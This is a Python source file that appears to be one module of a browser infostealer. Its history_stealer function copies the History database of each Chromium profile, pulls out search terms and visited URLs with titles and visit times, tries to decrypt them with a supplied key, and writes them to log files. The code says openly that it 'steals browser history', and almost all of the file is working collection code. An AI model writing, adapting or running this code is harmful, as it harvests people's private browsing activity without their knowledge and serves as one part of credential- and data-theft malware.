""" IMPORTS """
import json
import sqlite3
from util import get_profiles, create_temp_file, create_log_file, try_decrypt


"""
Tables of interest from SQLi Recon:
- keyword_search_terms: contains all the search terms
    - Columns of interest: term
- urls: 
    - Columns of interest: title, url, last_visit_time
    - There is also a column called 'hidden', which seems to refer to redirected sites (not very useful)
"""


def history_stealer(browser: dict, encryption_key: str) -> None:
    """ Steals browser history and places them into the logs directory """
    # Examine each profile
    profile_names = get_profiles(browser['path'])
    for profile_name in profile_names:
        # Copy original sqlite3 database to access it without killing any active Chromium processes
        db_path = create_temp_file(browser, profile_name, 'History')

        # Access sqlite3 database
        db_connection = sqlite3.connect(db_path)
        cursor = db_connection.cursor()

        # Extract history from database
        history = {
            'search_history': extract_search_history(cursor, encryption_key),
            'web_history': extract_web_history(cursor, encryption_key),
        }

        # Logs history
        if history:
            log_file_name = f"{browser['name']} {profile_name} History"
            create_log_file(history, log_file_name)

        # Close sqlite3 connection
        cursor.close()
        db_connection.close()



def extract_search_history(db_cursor, encryption_key: str) -> list[str]:
    # Query data
    db_cursor.execute('SELECT term FROM keyword_search_terms')
    # Process and return data
    return [try_decrypt(row[0], encryption_key) for row in db_cursor.fetchall()]


def extract_web_history(db_cursor, encryption_key: str) -> list[dict]:
    # Query data
    db_cursor.execute('SELECT title, url, last_visit_time FROM urls')
    # Process and return data
    data = [
        {
            'title': try_decrypt(title, encryption_key),
            'url': try_decrypt(url, encryption_key),
            'last_visit_time': try_decrypt(last_visit_time, encryption_key),
        }
        for title, url, last_visit_time in db_cursor.fetchall()
    ]
    return data
